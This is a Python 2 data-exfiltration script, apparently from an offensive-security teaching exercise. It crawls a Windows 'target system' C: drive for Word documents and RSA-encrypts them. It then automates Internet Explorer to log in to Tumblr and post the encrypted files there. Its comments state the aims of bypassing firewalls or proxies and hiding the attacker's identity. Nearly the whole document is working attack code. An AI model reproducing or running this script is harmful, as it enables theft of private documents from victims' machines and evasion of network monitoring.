# how to exfiltrate documents, spreadsheets, or other bits of data off the target system.
# This script will first hunt for Microsoft Word documents on the local filesystem.
# The doc will be encrypted and posted on 'tumblr.com'
# It will help to bypass any firewall or proxy and hide hacker's identity.
import win32com.client
import os
import fnmatch
import time
import random
import zlib

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

doc_type   = ".doc"
username   = "test@test.com"
password   = "passwd"

public_key = ""


def wait_for_browser(browser):

    # wait for the browser to finish loading a page
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)

    return


def encrypt_string(plaintext):

    chunk_size = 256

    print "Compressing: %d bytes" % len(plaintext)

    plaintext = zlib.compress(plaintext)

    print "Encrypting %d bytes" % len(plaintext)

    rsakey = RSA.importKey(public_key)
    rsakey = PKCS1_OAEP.new(rsakey)

    encrypted = ""
    offset    = 0

    while offset < len(plaintext):

        chunk = plaintext[offset:offset+256]
        # check the last chunk of the file
        if len(chunk) % chunk_size != 0:
            # pad chunk with spaces to ensure that successfully encrypt and decrypt
            chunk += " " * (chunk_size - len(chunk))

        encrypted += rsakey.encrypt(chunk)
        offset    += chunk_size
    # using base64-encode for post it to Tumblr blog without problems or weird encoding issues
    encrypted = encrypted.encode("base64")
    print "Base64 encoded crypto: %d" % len(encrypted)
    return encrypted


def encrypt_post(filename):
    # open and read the file
    fd = open(filename, "rb")
    contents = fd.read()
    fd.close()

    encrypted_title = encrypt_string(filename)
    encrypted_body  = encrypt_string(contents)

    return encrypted_title, encrypted_body


def random_sleep():
    time.sleep(random.randint(5, 10))
    return


def login_to_tumblr(ie):

    # retrieve all elements in the document
    full_doc = ie.Document.all

    # iterate looking for the logout form
    for i in full_doc:
        if i.id == "signup_email":
            i.setAttribute("value", username)
        elif i.id == "signup_password":
            i.setAttribute("value", password)

    random_sleep()

    # you can be presented with different homepages
    try:
        if ie.Document.forms[0].id == "signup_form":
            ie.Document.forms[0].submit()
        else:
            ie.Document.forms[1].submit()
    except IndexError, e:
        pass

    random_sleep()

    # the login form is the second form on the page
    wait_for_browser(ie)

    return


def post_to_tumblr(ie, title, post):

    full_doc = ie.Document.all

    for i in full_doc:
        if i.id == "post_one":
            i.setAttribute("value", title)
            title_box = i
            i.focus()
        elif i.id == "post_two":
            i.setAttribute("innerHTML", post)
            print "Set text area"
            i.focus()
        elif i.id == "create_post":
            print "Found post button"
            post_form = i
            i.focus()

    # move focus away from the main content box in order to activate post button
    random_sleep()
    title_box.focus()
    random_sleep()

    # post the form by click the post button
    post_form.children[0].click()
    wait_for_browser(ie)

    random_sleep()

    return

# call every document that wants to store on Tumblr
def exfiltrate(document_path):
    # creates a new instance of the Internet Explorer COM object
    ie = win32com.client.Dispatch("InternetExplorer.Application")
    # set the process to be visible or not
    ie.Visible = 1

    # head to tumblr and login
    ie.Navigate("http://www.tumblr.com/login")
    wait_for_browser(ie)

    print "Logging in..."
    login_to_tumblr(ie)
    print "Logged in...navigating"

    ie.Navigate("https://www.tumblr.com/new/text")
    wait_for_browser(ie)

    # encrypt the file
    title, body = encrypt_post(document_path)

    print "Creating new post..."
    post_to_tumblr(ie, title, body)
    print "Posted!"

    # Destroy the IE instance
    ie.Quit()
    ie = None

    return

# main loop for document discovery
# responsible for crawling through the "C:\" drive on the target system
# and attempting to match preset file extension
for parent, directories, filenames in os.walk("C:\\"):
    for filename in fnmatch.filter(filenames, "*%s" % doc_type):
        document_path = os.path.join(parent, filename)
        print "Found: %s" % document_path
        exfiltrate(document_path)
        raw_input("Continue?")

# extending the project :
    # encrypt a length field at the beginning of the blog post contents
    # read this length after decrypting the blog post contents and trim the file to that exact size.
